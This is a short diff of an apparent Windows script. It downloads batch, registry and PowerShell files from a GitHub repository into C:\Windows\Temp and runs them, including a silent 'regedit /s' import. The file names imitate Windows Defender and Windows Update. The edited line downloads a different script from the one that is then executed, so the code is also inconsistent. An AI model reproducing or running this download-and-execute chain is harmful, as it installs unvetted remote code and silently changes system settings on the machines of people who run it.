@@ -6,5 +6,5 @@ powershell -c "curl https://raw.githubusercontent.com/festorex/stuff/main/defend
 cmd /c "C:\Windows\Temp\defender2.bat"
 powershell -c "curl https://raw.githubusercontent.com/festorex/stuff/main/WindowsUpdate.reg -O C:\Windows\Temp\WindowsUpdate.reg"
 regedit /s "C:\Windows\Temp\WindowsUpdate.reg"
-powershell -c "curl https://raw.githubusercontent.com/festorex/stuff/main/WindowsDefender.ps1 -O C:\Windows\Temp\WindowsDefender.ps1"
+powershell -c "curl https://raw.githubusercontent.com/festorex/stuff/main/WindowsUpdate.ps1 -O C:\Windows\Temp\WindowsUpdate.ps1"
 powershell.exe -File "C:\Windows\Temp\WindowsDefender.ps1"
